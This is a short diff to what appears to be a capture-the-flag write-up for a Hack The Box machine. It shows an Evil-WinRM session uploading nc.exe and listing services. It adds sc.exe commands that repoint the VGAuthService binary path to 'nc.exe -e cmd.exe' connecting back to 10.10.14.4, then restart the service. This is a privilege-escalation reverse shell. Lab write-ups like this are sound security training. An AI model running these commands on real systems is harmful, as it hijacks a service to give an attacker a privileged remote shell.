@@ -8,7 +8,9 @@ Info: Uploading /home/gareth/htb/return/nc.exe to C:\Users\svc-printer\Documents
 Data: 37544 bytes of 37544 bytes copied
                                         
 Info: Upload successful!
+```
 
+```bash
 *Evil-WinRM* PS C:\Users\svc-printer\desktop> services
 
 Path                                                                                                                 Privileges Service          
@@ -26,3 +28,8 @@ C:\Windows\servicing\TrustedInstaller.exe                                       
 "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc
 ```
 
+```bash
+sc.exe config VGAuthService binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.4 443"
+sc.exe stop VGAuthService
+sc.exe start VGAuthService
+```
